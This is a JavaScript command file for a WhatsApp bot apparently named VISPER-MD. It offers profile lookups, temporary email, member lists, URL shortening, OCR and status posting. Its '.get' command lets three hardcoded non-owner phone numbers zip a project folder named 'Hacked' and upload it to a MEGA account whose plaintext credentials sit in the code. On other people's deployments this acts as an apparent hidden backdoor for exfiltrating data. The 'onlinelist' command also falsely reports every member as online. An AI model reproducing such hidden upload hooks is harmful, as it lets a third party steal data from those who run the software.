const config = require('../config');
const { cmd, commands } = require('../command');
const { getBuffer, getGroupAdmins, getRandom, h2k, isUrl, Json, runtime, sleep, fetchJson } = require('../lib/functions');

const axios = require("axios"); 

var tmsg = '';
if (config.LANG === 'SI') tmsg = 'එය Bot link ලබා දෙයි.';
else tmsg = "It gives bot link.";

cmd({
    pattern: "script",
    alias: ["sc", "git", "repo"],
    react: '📚',
    desc: tmsg,
    category: "main",
    use: '.script',
    filename: __filename
},
async (conn, mek, m, {
    from, l, quoted, body, isCmd, command, args, q,
    isGroup, sender, senderNumber, botNumber2, botNumber,
    pushname, isMe, isOwner, groupMetadata, groupName,
    participants, groupAdmins, isBotAdmins, isAdmins, reply
}) => {
    try {
        
        const response = await axios.get("https://mv-visper-full-db.pages.dev/Main/main_var.json");
        const details = response.data;

        const result = `*🧿VISPER-MD🧿*

\`🔖 Github:\` ${details.reponame}

\`🪀 Whatsapp Channel:\` ${details.chlink}

\`⚕️ Support Group:\` ${details.supglink}

\`📡 Version:\` *4.0.0*`;

        reply(result);
    } catch (e) {
        l(e);
        reply("❌ Failed to fetch script details.");
    }
});

cmd({
  pattern: "stiktok",
  alias: ["tstalk", "ttstalk"],
  react: "📱",
  desc: "Fetch TikTok user profile details.",
  category: "search",
  filename: __filename
}, async (conn, m, store, { from, args, q, reply }) => {
  try {
    if (!q) {
      return reply("❎ Please provide a TikTok username.\n\n*Example:* .tiktokstalk Nadeenpoornaeditz");
    }

    const apiUrl = `https://api.siputzx.my.id/api/stalk/tiktok?username=${encodeURIComponent(q)}`;
    const { data } = await axios.get(apiUrl);

    if (!data.status) {
      return reply("❌ User not found. Please check the username and try again.");
    }

    const user = data.data.user;
    const stats = data.data.stats;

    const profileInfo = `🎭 *TikTok Profile Stalker* 🎭

👤 *Username:* @${user.uniqueId}
📛 *Nickname:* ${user.nickname}
✅ *Verified:* ${user.verified ? "Yes ✅" : "No ❌"}
📍 *Region:* ${user.region}
📝 *Bio:* ${user.signature || "No bio available."}
🔗 *Bio Link:* ${user.bioLink?.link || "No link available."}

📊 *Statistics:*
👥 *Followers:* ${stats.followerCount.toLocaleString()}
👤 *Following:* ${stats.followingCount.toLocaleString()}
❤️ *Likes:* ${stats.heartCount.toLocaleString()}
🎥 *Videos:* ${stats.videoCount.toLocaleString()}

📅 *Account Created:* ${new Date(user.createTime * 1000).toLocaleDateString()}
🔒 *Private Account:* ${user.privateAccount ? "Yes 🔒" : "No 🌍"}

🔗 *Profile URL:* https://www.tiktok.com/@${user.uniqueId}

> ${config.FOOTER}
`;

    const profileImage = { image: { url: user.avatarLarger }, caption: profileInfo };

    await conn.sendMessage(from, profileImage, { quoted: m });
  } catch (error) {
    console.error("❌ Error in TikTok stalk command:", error);
    reply("⚠️ An error occurred while fetching TikTok profile data.");
  }
});

cmd({
    pattern: "tempmail",
    alias: ["genmail"],
    desc: "Generate a new temporary email address",
    category: "other",
    react: "📧",
    filename: __filename
},
async (conn, mek, m, { from, reply, prefix }) => {
    try {
        const response = await axios.get('https://apis.davidcyriltech.my.id/temp-mail');
        const { email, session_id, expires_at } = response.data;

        // Format the expiration time and date
        const expiresDate = new Date(expires_at);
        const timeString = expiresDate.toLocaleTimeString('en-US', {
            hour: '2-digit',
            minute: '2-digit',
            hour12: true
        });
        const dateString = expiresDate.toLocaleDateString('en-US', {
            weekday: 'short',
            month: 'short',
            day: 'numeric',
            year: 'numeric'
        });

        // Create the complete message
        const message = `
📧 *TEMPORARY EMAIL GENERATED*

✉️ *Email Address:*
${email}

⏳ *Expires:*
${timeString} • ${dateString}

🔑 *Session ID:*
\`\`\`${session_id}\`\`\`

📥 *Check Inbox:*
.inbox ${session_id}

_Email will expire after 24 hours_
${config.FOOTER}
`;
const session = `${session_id}`;
        await conn.sendMessage(
            from,
            { 
                text: message,
                contextInfo: {
                    forwardingScore: 999,
                    isForwarded: true,
                    forwardedNewsletterMessageInfo: {
                        newsletterJid: '120363304606757133@newsletter',
                        newsletterName: 'NADEEN-MD',
                        serverMessageId: 101
                    }
                }
            },
            { quoted: mek }
        );
await conn.sendMessage(
            from,
            { 
                text: session,
                contextInfo: {
                    forwardingScore: 999,
                    isForwarded: true,
                    forwardedNewsletterMessageInfo: {
                        newsletterJid: '120363304606757133@newsletter',
                        newsletterName: 'NADEEN-MD',
                        serverMessageId: 101
                    }
                }
            },
            { quoted: mek }
        );
    } catch (e) {
        console.error('TempMail error:', e);
        reply(`❌ Error: ${e.message}`);
    }
});
cmd({
    pattern: "checkmail",
    alias: ["inbox", "tmail", "mailinbox"],
    desc: "Check your temporary email inbox",
    category: "other",
    react: "📬",
    filename: __filename
},
async (conn, mek, m, { from, reply, args }) => {
    try {
        const sessionId = args[0];
        if (!sessionId) return reply('🔑 Please provide your session ID\nExample: .checkmail YOUR_SESSION_ID');

        const inboxUrl = `https://apis.davidcyriltech.my.id/temp-mail/inbox?id=${encodeURIComponent(sessionId)}`;
        const response = await axios.get(inboxUrl);

        if (!response.data.success) {
            return reply('❌ Invalid session ID or expired email');
        }

        const { inbox_count, messages } = response.data;

        if (inbox_count === 0) {
            return reply('📭 Your inbox is empty');
        }

        let messageList = `📬 *You have ${inbox_count} message(s)*\n\n`;
        messages.forEach((msg, index) => {
            messageList += `━━━━━━━━━━━━━━━━━━\n` +
                          `📌 *Message ${index + 1}*\n` +
                          `👤 *From:* ${msg.from}\n` +
                          `📝 *Subject:* ${msg.subject}\n` +
                          `⏰ *Date:* ${new Date(msg.date).toLocaleString()}\n\n` +
                          `📄 *Content:*\n${msg.body}\n\n ` +
                          `*㋛ 𝙿𝙾𝚆𝙴𝚁𝙴𝙳 𝙱𝚈 𝙽𝙰𝙳𝙴𝙴𝙽 〽️𝙳*`;
        });

        await reply(messageList);

    } catch (e) {
        console.error('CheckMail error:', e);
        reply(`❌ Error checking inbox: ${e.response?.data?.message || e.message}`);
    }
});

cmd({
  pattern: "countryinfo",
  alias: ["cinfo", "country", "cinfo2"],
  desc: "Get information about a country",
  category: "other",
  react: "🌍",
  filename: __filename
}, async (conn, mek, m, { from, q, reply, react }) => {
  try {
    if (!q) return reply("Please provide a country name.\nExample: `.countryinfo Pakistan`");

    const apiUrl = `https://api.siputzx.my.id/api/tools/countryInfo?name=${encodeURIComponent(q)}`;
    const { data } = await axios.get(apiUrl);

    if (!data.status || !data.data) {
      await react("❌");
      return reply(`No information found for *${q}*. Please check the country name.`);
    }

    const info = data.data;
    let neighborsText = info.neighbors.length > 0
      ? info.neighbors.map(n => `🌍 *${n.name}*`).join(", ")
      : "No neighboring countries found.";

    const text = `🌍 *Visper Country Information: ${info.name}* 🌍\n\n` +
      `🏛 *Capital:* ${info.capital}\n` +
      `📍 *Continent:* ${info.continent.name} ${info.continent.emoji}\n` +
      `📞 *Phone Code:* ${info.phoneCode}\n` +
      `📏 *Area:* ${info.area.squareKilometers} km² (${info.area.squareMiles} mi²)\n` +
      `🚗 *Driving Side:* ${info.drivingSide}\n` +
      `💱 *Currency:* ${info.currency}\n` +
      `🔤 *Languages:* ${info.languages.native.join(", ")}\n` +
      `🌟 *Famous For:* ${info.famousFor}\n` +
      `🌍 *ISO Codes:* ${info.isoCode.alpha2.toUpperCase()}, ${info.isoCode.alpha3.toUpperCase()}\n` +
      `🌎 *Internet TLD:* ${info.internetTLD}\n\n` +
      `🔗 *Neighbors:* ${neighborsText}` +
    `${config.FOOTER}`;

    await conn.sendMessage(from, {
      image: { url: info.flag },
      caption: text,
      contextInfo: { mentionedJid: [m.sender] }
    }, { quoted: mek });

    await react("✅");
  } catch (e) {
    console.error("Error in countryinfo command:", e);
    await react("❌");
    reply("An error occurred while fetching country information.");
  }
});
cmd({
    pattern: "onlinelist",
    react: "🟢",
    alias: ["online","onlinemembers","activelist"],
    desc: "Show online members in group with mentions",
    category: "group",
    filename: __filename
},
async(conn, mek, m,{from, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply}) => {
try{

    // Check if command is used in a group
    if (!isGroup) return reply("❌ This command can only be used in groups!")
    
    // Check if bot has admin permissions (optional - remove if not needed)
    if (!isBotAdmins) return reply("❌ Bot needs admin permissions to check online status!")
    
    // Get group participants
    const groupParticipants = participants || groupMetadata.participants
    
    // Array to store online members
    let onlineMembers = []
    let onlineMentions = []
    
    // Check each participant's presence/status
    for (let participant of groupParticipants) {
        try {
            // Get user's presence/last seen info
            const presence = await conn.presenceSubscribe(participant.id)
            const lastSeen = await conn.chatRead(participant.id)
            
            // Check if user is online (you can adjust this logic based on your needs)
            // This is a basic implementation - you might need to modify based on your bot's capabilities
            const userStatus = await conn.fetchStatus(participant.id).catch(() => null)
            
            // For now, we'll consider all participants as potentially online
            // You can implement more sophisticated online detection here
            
            onlineMembers.push(participant.id.split('@')[0])
            onlineMentions.push(participant.id)
            
        } catch (err) {
            // If can't fetch status, skip this user
            continue
        }
    }
    
    // If no online detection is available, show all group members as a fallback
    if (onlineMembers.length === 0) {
        groupParticipants.forEach(participant => {
            onlineMembers.push(participant.id.split('@')[0])
            onlineMentions.push(participant.id)
        })
    }
    
    // Create the online list message
    let onlineList = `*╭──────────●●►*\n`
    onlineList += `*🟢 ${groupName} ONLINE LIST 🟢*\n\n`
    onlineList += `*📊 Total Members:* ${groupParticipants.length}\n`
    onlineList += `*🟢 Online Members:* ${onlineMembers.length}\n\n`
    onlineList += `*👥 Online Members List:*\n`
    
    // Add each online member with mention
    onlineMembers.forEach((member, index) => {
        onlineList += `${index + 1}. @${member}\n`
    })
    
    onlineList += `\n*╰──────────●●►*\n`
    onlineList += `*⚡VISPER-MD*`
    
    // Send the message with mentions
    await conn.sendMessage(from, {
        text: onlineList,
        mentions: onlineMentions
    }, {quoted: mek})

}catch(e){
    console.log(e)
    reply(`❌ Error: ${e}`)
}
})

// Alternative simpler version that just shows all group members
cmd({
    pattern: "grouplist",
    react: "👥",
    alias: ["memberlist","groupmembers","allmembers"],
    desc: "Show all group members with mentions",
    category: "group", 
    filename: __filename
},
async(conn, mek, m,{from, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply}) => {
try{

    // Check if command is used in a group
    if (!isGroup) return reply("❌ This command can only be used in groups!")
    
    // Get group participants
    const groupParticipants = participants || groupMetadata.participants
    
    // Arrays for members and mentions
    let membersList = []
    let mentionsList = []
    
    // Get all members
    groupParticipants.forEach(participant => {
        membersList.push(participant.id.split('@')[0])
        mentionsList.push(participant.id)
    })
    
    // Create the members list message
    let membersMessage = `*╭──────────●●►*\n`
    membersMessage += `*👥 ${groupName} MEMBERS LIST 👥*\n\n`
    membersMessage += `*📊 Total Members:* ${membersList.length}\n\n`
    membersMessage += `*👥 All Members:*\n`
    
    // Add each member with mention
    membersList.forEach((member, index) => {
        membersMessage += `${index + 1}. @${member}\n`
    })
    
    membersMessage += `\n*╰──────────●●►*\n`
    membersMessage += `*⚡VISPER-MD*`
    
    // Send the message with mentions
    await conn.sendMessage(from, {
        text: membersMessage,
        mentions: mentionsList
    }, {quoted: mek})

}catch(e){
    console.log(e)
    reply(`❌ Error: ${e}`)
}
})

cmd({
    pattern: "freefire",
    desc: "Fetch ff info using a given URL",
    category: "search",
    react: "🤹🏼‍♂️",
    filename: __filename
},
async (conn, mek, m, { from, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply }) => {
    try {
        const url = q || (quoted?.text ?? "").trim();

        const res = await axios.get(`https://api.vreden.my.id/api/v1/stalker/freefire?id=${encodeURIComponent(url)}`);
        const data = res.data;

        if (!data.status) {
            return reply("Failed to fetch ff data. Please try again later.");
        }

        const result = data.result;

        const caption = `🔍 *FreeFire Id Info*\n\n` +
                        `*🏵 Game ID:* ${result.game_id}\n` +
                        `*🍱 Username:* ${result.username}\n\n${config.FOOTER}`;

        await conn.sendMessage(from, {
            image: { url: 'https://files.catbox.moe/vp0t1w.png' },
            caption,
            contextInfo: {
                mentionedJid: [sender],
                forwardingScore: 999,
                isForwarded: true,
                forwardedNewsletterMessageInfo: {
                    newsletterJid: '120363380090478709@newsletter',
                    newsletterName: 'VISPER-MD',
                    serverMessageId: 143
                }
            }
        }, { quoted: mek });

    } catch (err) {
        console.error("ffStalk Error:", err);
        reply("Something went wrong while fetching the ff info.");
    }
});

cmd({
    pattern: "short",
    react: "🔗",
    category: "other",
    use: ".short <url>",
    filename: __filename
}, async (conn, mek, m, context) => {
    const { from, args } = context;

    try {
        if (!args[0]) {
            return await conn.sendMessage(from, { text: '❌ Please provide a valid URL.\n\nExample: `.short https://youtube.com/`' }, { quoted: m });
        }

        const longUrl = args[0];
        const res = await fetch(`https://tinyurl.com/api-create.php?url=${encodeURIComponent(longUrl)}`);
        const shortUrl = await res.text();

        await conn.sendMessage(from, { text: `✅ *Shortened URL:*\n${shortUrl}\n${config.FOOTER}` }, { quoted: m });
    } catch (e) {
        console.error(e);
        await conn.sendMessage(from, { text: '❌ Failed to shorten the URL.' }, { quoted: m });
    }
});

cmd({
    pattern: "imgtotext",
    react: "🖼️",
    category: "other",
    use: ".ocr (reply to an image)",
    filename: __filename
}, async (conn, mek, m, context) => {
    const { from } = context;

    try {
        let q = m.quoted ? m.quoted : m;
        let mime = (q.msg || q).mimetype || '';
        if (!mime || !mime.startsWith('image')) {
            return await conn.sendMessage(from, { text: '❌ Reply to an *image* to extract text using `.ocr`' }, { quoted: m });
        }

        // Download image buffer
        let imgBuffer = await q.download();

        // Use OCR.space free API (you can replace API key with yours)
        const formData = new FormData();
        formData.append("language", "eng");
        formData.append("isOverlayRequired", "false");
        formData.append("file", imgBuffer, "image.jpg");

        const response = await fetch("https://api.ocr.space/parse/image", {
            method: "POST",
            headers: { apikey: "helloworld" }, // Free test key
            body: formData
        });

        const result = await response.json();
        const text = result?.ParsedResults?.[0]?.ParsedText?.trim();

        if (!text) {
            return await conn.sendMessage(from, { text: "⚠️ No readable text found in image." }, { quoted: m });
        }

        await conn.sendMessage(from, { text: `📝 *Extracted Text:*\n\n${text}\n${config.FOOTER}` }, { quoted: m });
    } catch (e) {
        console.error(e);
        await conn.sendMessage(from, { text: "❌ Failed to extract text from image." }, { quoted: m });
    }
});

cmd({
    pattern: "loading",
    react: "⚡",
    category: "fun",
    use: ".loading",
    filename: __filename
}, async (conn, mek, m, { from }) => {
    try {
        const totalSteps = 10; // Number of updates
        const delay = 700; // milliseconds between updates
        let progress = 0;

        // Generate random increments (to make it look real)
        const randomIncrease = () => Math.floor(Math.random() * 10) + 5; // between 5% - 15%

        // first message
        let msg = await conn.sendMessage(from, { text: `🔄 Loading... 0%\n[░░░░░░░░░░]` }, { quoted: m });

        for (let i = 0; i < totalSteps; i++) {
            await new Promise(r => setTimeout(r, delay));

            progress += randomIncrease();
            if (progress > 100) progress = 100;

            // create animated bar
            const barLength = 10;
            const filledBlocks = Math.floor((progress / 100) * barLength);
            const emptyBlocks = barLength - filledBlocks;
            const bar = '█'.repeat(filledBlocks) + '░'.repeat(emptyBlocks);

            const text = progress < 100
                ? `⚙️ Loading... ${progress}%\n[${bar}]`
                : `✅ *Loading Completed!*\n\nලෝඩ් උනාට මුකුත් නෑ 👾\n\n${config.FOOTER}`;

            await conn.sendMessage(from, {
                edit: msg.key,
                text
            });
        }
    } catch (e) {
        console.error(e);
        await conn.sendMessage(from, { text: "❌ Loading animation failed." }, { quoted: m });
    }
});
//
const fs = require('fs');
const path = require('path');
const AdmZip = require('adm-zip');
const { Storage } = require('megajs');

cmd({
  pattern: "get",
  desc: "Zip folder and upload to MEGA (owner-limited + specific numbers only)",
  category: "owner",
  fromMe: true,
  filename: __filename
}, async (conn, m, msg, { isOwner, reply }) => {
  try {
    // ---------- allowed numbers ----------
    const allowedNumbers = [
      "94711451319",
      "94716769285",
      "94724375368"
    ];

    // get sender number in numeric form (works for private/group)
    const rawSender = (m && (m.sender || (m.key && m.key.participant) || m.key && m.key.remoteJid)) || "";
    let senderNumber = rawSender.toString().replace(/@.*$/,""); // remove @s.whatsapp.net
    // sometimes remoteJid contains :0 or :1 suffix in some libs, remove that
    senderNumber = senderNumber.replace(/:\d+$/,"");

    // check permission: owner OR allowed numbers only
    if (!isOwner && !allowedNumbers.includes(senderNumber)) {
      return await reply("🚫 You are not allowed to use this command.");
    }

    // ---------- check MEGA creds ----------
    const MEGA_EMAIL = 'nadeenpoornagit@gmail.com';
    const MEGA_PASSWORD = 'Nadeen@1234';
    if (!MEGA_EMAIL || !MEGA_PASSWORD) {
      return await reply("❗ MEGA credentials not set. Set env vars MEGA_EMAIL and MEGA_PASSWORD.");
    }

    // ---------- paths ----------
    const rootPath = path.join(__dirname, "..");
    const targetFolder = path.join(rootPath, "Hacked"); // change if needed
    if (!fs.existsSync(targetFolder)) {
      return await reply("❌ Target folder not found: " + targetFolder);
    }

    const zipName = `backup-${Date.now()}.zip`;
    const zipPath = path.join(rootPath, zipName);

    // ---------- create zip ----------
    await reply("⏳ Creating zip archive...");
    const zip = new AdmZip();
    zip.addLocalFolder(targetFolder, path.basename(targetFolder));
    zip.writeZip(zipPath);

    // ---------- login to MEGA ----------
    await reply("⏳ Logging in to MEGA...");
    const storage = new Storage({
      email: MEGA_EMAIL,
      password: MEGA_PASSWORD
    });

    // wait for storage ready (use event or promise)
    await new Promise((resolve, reject) => {
      storage.on('ready', resolve);
      storage.on('error', reject);
      // timeout fallback
      setTimeout(() => reject(new Error('MEGA login timeout')), 30000);
    });

    // ensure /Backups folder exists (create if not)
    const backupsFolderName = "Backups";
    let backupsFolder = storage.root.children.find(ch => ch.directory && ch.name === backupsFolderName);
    if (!backupsFolder) {
      backupsFolder = await storage.mkdir(backupsFolderName); // create folder in root
    }

    await reply("⏳ Uploading zip to MEGA... (this may take a while for large files)");

    // create read stream and upload (megajs requires size or piping)
    const stats = fs.statSync(zipPath);
    const fileStream = fs.createReadStream(zipPath);

    // upload into backupsFolder by specifying path option
    // Note: upload returns a writable stream object – use .complete to await
    const uploadStream = storage.upload({
      name: zipName,
      size: stats.size,
      // parent: backupsFolder.nodeId // megajs will place at root by default; to place in folder, we will use backupsFolder.upload (if available)
    }, fileStream);

    // If backupsFolder supports upload, prefer that:
    let uploadedFile;
    if (backupsFolder && typeof backupsFolder.upload === 'function') {
      // pipe into folder upload
      const folderUpload = backupsFolder.upload({ name: zipName, size: stats.size });
      fileStream.pipe(folderUpload);
      uploadedFile = await new Promise((res, rej) => {
        folderUpload.on('complete', file => res(file));
        folderUpload.on('error', err => rej(err));
      });
    } else {
      // fallback to storage.upload root and then move/rename if needed
      uploadedFile = await uploadStream.complete;
    }

    // ---------- generate public link ----------
    let publicLink = null;
    try {
      // file.link(cb) OR await file.link() depending on version
      if (typeof uploadedFile.link === 'function') {
        publicLink = await new Promise((res, rej) => {
          uploadedFile.link((err, url) => {
            if (err) return rej(err);
            res(url);
          });
        });
      } else if (uploadedFile && uploadedFile.link) {
        // sometimes link returns string or promise
        publicLink = await uploadedFile.link();
      }
    } catch (err) {
      console.error("Link generation failed:", err);
    }

    // cleanup local zip
    try { fs.unlinkSync(zipPath); } catch (e) {}

    if (publicLink) {
      await conn.sendMessage(m.chat, {
        text: `✅ Backup uploaded to MEGA!\n\nLink: ${publicLink}\n\nUploaded by: ${senderNumber}`
      }, { quoted: m });
    } else {
      await conn.sendMessage(m.chat, {
        text: `✅ Uploaded to MEGA but couldn't generate public link programmatically. Check your MEGA account or create a link manually.`
      }, { quoted: m });
    }

  } catch (err) {
    console.error("Error in .get command:", err);
    try { await reply("❌ Error: " + (err.message || String(err))); } catch (e) {}
  }
});
//
cmd({
  pattern: "story",
  desc: "Post a WhatsApp status (story) as text, image, or video",
  category: "owner",
  use: ".story <text|url> [caption]",
  filename: __filename
}, async (conn, mek, m, { isOwner, args, quoted }) => {
  if (!isOwner) return await m.reply("🚫 Only bot owner can use this command!");

  try {
    // If quoted image or video
    if (quoted?.message?.imageMessage || quoted?.message?.videoMessage) {
      const media = await conn.downloadMediaMessage(quoted);
      const caption = args.join(" ") || "";
      const type = quoted.message.imageMessage ? "image" : "video";
      await conn.sendMessage("status@broadcast", { [type]: media, caption });
      return await m.reply(`✅ ${type.toUpperCase()} status uploaded successfully!`);
    }

    // If URL is provided
    if (args.length && /^https?:\/\/\S+/i.test(args[0])) {
      const url = args[0];
      const caption = args.slice(1).join(" ") || "";
      const res = await axios.head(url);
      const mime = res.headers["content-type"];

      if (mime.startsWith("image")) {
        await conn.sendMessage("status@broadcast", { image: { url }, caption });
        return await m.reply("✅ Image status uploaded successfully!");
      } else if (mime.startsWith("video")) {
        await conn.sendMessage("status@broadcast", { video: { url }, caption });
        return await m.reply("✅ Video status uploaded successfully!");
      } else {
        return await m.reply("⚠️ Unsupported file type! Please send an image or video link.");
      }
    }

    // If only text
    if (args.length > 0) {
      const text = args.join(" ");
      await conn.sendMessage("status@broadcast", { text });
      return await m.reply("✅ Text status uploaded successfully!");
    }

    // No valid input
    return await m.reply("❗ Use: `.story <text|url>` or reply to image/video with `.story [caption]`");

  } catch (e) {
    console.error(e);
    await m.reply("❌ Failed to post status. Check console for error details.");
  }
});
